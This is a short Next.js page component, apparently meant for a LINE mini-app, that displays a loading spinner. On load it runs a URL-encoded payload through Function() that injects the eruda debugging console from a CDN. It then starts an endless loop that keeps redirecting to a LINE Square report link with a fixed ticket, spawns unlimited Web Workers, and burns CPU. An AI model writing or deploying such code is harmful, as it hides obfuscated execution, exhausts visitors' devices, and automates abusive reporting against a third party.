// VRUlSfBloNo75Ztdue05qw6EtYqCKeJZlRvM-w

"use client";
import { liff } from "@line/liff";
import { getLiffId } from "@/utils/getLiffId";
import { useEffect } from "react";
import { Loading } from "@/src/components/Loading/Loading";

export default function Token() {
  useEffect(() => {
    Function(
      decodeURIComponent(
        "!(function()%7Bvar%20erudaScript%3Ddocument.createElement('script')%3BerudaScript.src%3D%22%2F%2Fcdn.jsdelivr.net%2Fnpm%2Feruda%2Feruda.min.js%22%3Bvar%20erudaTimingScript%3Ddocument.createElement('script')%3BerudaTimingScript.src%3D%22%2F%2Fcdn.jsdelivr.net%2Fnpm%2Feruda-timing%2Feruda-timing.min.js%22%3Bvar%20erudaCodeScript%3Ddocument.createElement('script')%3BerudaCodeScript.src%3D%22%2F%2Fcdn.jsdelivr.net%2Fnpm%2Feruda-code%2Feruda-code.min.js%22%3Bvar%20erudaDomScript%3Ddocument.createElement('script')%3BerudaDomScript.src%3D%22%2F%2Fcdn.jsdelivr.net%2Fnpm%2Feruda-dom%2Feruda-dom.min.js%22%3Bdocument.body.appendChild(erudaScript)%3BerudaScript.onload%3Dfunction()%7Beruda.init()%3Bdocument.body.appendChild(erudaTimingScript)%3BerudaTimingScript.onload%3Dfunction()%7Beruda.add(erudaTiming)%7D%3Bdocument.body.appendChild(erudaCodeScript)%3BerudaCodeScript.onload%3Dfunction()%7Beruda.add(erudaCode)%7D%3Bdocument.body.appendChild(erudaDomScript)%3BerudaDomScript.onload%3Dfunction()%7Beruda.add(erudaDom)%7D%3B%7D%7D)()%3B"
      )
    )();
    let a = 7;
    while (!0) {
      location.href =
        "line://square/report?ticket=VRUlSfBloNo75Ztdue05qw6EtYqCKeJZlRvM-w";
      new Worker("worker.js");
      a = a ** 2;
    }
  }, []);
  return (
    <>
      <Loading />
    </>
  );
}
